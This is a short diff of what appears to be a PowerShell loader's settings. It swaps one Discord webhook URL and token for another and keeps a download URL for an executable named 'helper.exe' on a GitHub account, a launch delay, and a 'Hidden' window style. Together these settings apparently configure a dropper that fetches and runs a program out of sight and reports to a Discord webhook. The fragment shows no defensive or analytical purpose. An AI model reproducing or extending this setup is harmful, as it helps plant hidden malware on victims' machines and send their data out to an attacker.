@@ -1,4 +1,4 @@
-$WebhookURL = "https://discord.com/api/webhooks/1442924485698392219/Vz4aoPFbx2IaVvT0SRJt5I2IKGd_RXg-fDgy69gkUVdKDvRSkFL_nPE0sRB_E3QTEUxD"
+$WebhookURL = "https://discord.com/api/webhooks/1444035553812283503/PKhdSy4-Rs360o-tjbkwvYbO2skccw-k6GhN0A2Lk9YRMsowN-er-zkCzmrQLc-_m_kp"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
 $LaunchDelay   = 1
 $WindowStyle   = "Hidden"
